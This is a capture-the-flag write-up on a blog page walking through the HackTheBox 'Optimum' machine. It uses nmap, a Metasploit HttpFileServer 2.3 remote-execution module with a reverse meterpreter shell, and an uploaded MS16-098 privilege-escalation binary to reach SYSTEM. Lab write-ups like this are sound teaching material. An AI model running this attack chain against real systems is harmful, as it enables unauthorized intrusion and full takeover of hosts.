<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="../assets/js/navbar.js"></script><style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbar">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                    <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                HackTheBox: Optimum
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                Jan, 2021
            </h2>
        </div>
    </div>
<section class="section mt-2">
  <div class="container">
  <div class="columns">
  <div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">Optimum</a></li>
        </ul>
      </nav>
<h1 >Scanning:</h1><p >Find running services:</p><pre id="75c756f3-286d-4318-aca6-c63124a518d0" class="code code-wrap"><code><span>crazyeights@es-base:~$ nmap -PS 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-15 10:42 EST
Nmap scan report for 10.10.10.8
Host is up (0.034s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http</span></code></pre><h2 >Port 80:</h2><figure id="a61deff0-375a-4fc4-85cd-cd80cb50f022" class="image"><a href="Optimum%20a61deff0375a4fc485cdcd80cb50f022/Screenshot_from_2021-01-15_10-43-14.png"><img style="width:958px" src="Optimum%20a61deff0375a4fc485cdcd80cb50f022/Screenshot_from_2021-01-15_10-43-14.png"/></a></figure><p >In the page source we find the server publisher name:</p><pre id="fe16ea01-b2e5-4741-8f2a-07a1c8bd444d" class="code code-wrap"><code><a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a></code></pre><p >There are exploits for this version:</p><figure id="25550dc0-0c27-42a6-bd04-e228f2ea9cd5" class="image"><a href="Optimum%20a61deff0375a4fc485cdcd80cb50f022/Screenshot_from_2021-01-15_10-46-14.png"><img style="width:1122px" src="Optimum%20a61deff0375a4fc485cdcd80cb50f022/Screenshot_from_2021-01-15_10-46-14.png"/></a></figure><p >Trying the metasploit version:</p><pre id="635aba0c-f3ce-4dc3-adc4-e4efa72b6129" class="code code-wrap"><code><span>msf5> search rejetto


  0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/rejetto_hfs_exec) > options

msf5 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.25
LHOST => 10.10.14.25
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8

msf5 exploit(windows/http/rejetto_hfs_exec) > exploit</span></code></pre><p >
</p><h2 >User</h2><p >After running the exploit we now have user:</p><pre id="3fffbffa-43ff-49ff-8986-8e3fd31f7fef" class="code code-wrap"><code><span>meterpreter > getuid
Server username: OPTIMUM\kostas
meterpreter ></span></code></pre><p >We can now get the user flag:</p><pre id="98c92134-c463-4c57-b0d7-d75303061e9c" class="code code-wrap"><code><span>meterpreter > pwd
C:\Users\kostas\Desktop
meterpreter > dir

100444/r--r--r--  32      fil   2017-03-18 08:13:18 -0400  user.txt.txt

meterpreter > cat user.txt.txt
d0c39_i_dont_want_to_get_in_trouble</span></code></pre><p >Listing system info:</p><pre id="78643853-3fa7-4ffc-8c8a-cfed5d68f601" class="code code-wrap"><code><span>meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows</span></code></pre><p >This version of the OS has an vulnerability that will allow us to elevate our privileges.</p><p > Found the link to the repo with the exploit exe at the first link, and the exec at the second.</p><pre id="d8220af2-e84d-4219-987e-8f8f479d3841" class="code code-wrap"><code><span>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098</span></code></pre><p >
</p><h2 >Root</h2><p >Upload and run the exploit to get system:</p><pre id="0a58666c-15f1-4743-86ea-5db59d605f49" class="code code-wrap"><code><span>meterpreter > upload Downloads/bfill.exe
[*] uploading  : Downloads/bfill.exe -> bfill.exe
[*] Uploaded 547.00 KiB of 547.00 KiB (100.0%): Downloads/bfill.exe -> bfill.exe
[*] uploaded   : Downloads/bfill.exe -> bfill.exe

meterpreter > shell
Process 1828 created.
Channel 12 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas>bfill.exe
bfill.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas>whoami
whoami
nt authority\system

C:\Users\kostas></span></code></pre><p >The root flag can be found on the Administrator&#x27;s desktop.</p><pre id="45076b4e-e531-414f-9497-f71ed6b5d0df" class="code code-wrap"><code><span>C:\Users\Administrator\Desktop>type root.txt
type root.txt
51ed_i_dont_want_to_get_in_trouble</span></code></pre><p >
</p><p >FIN. ðŸ¥³</p>
</div>
</div></div></section><footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>
</html>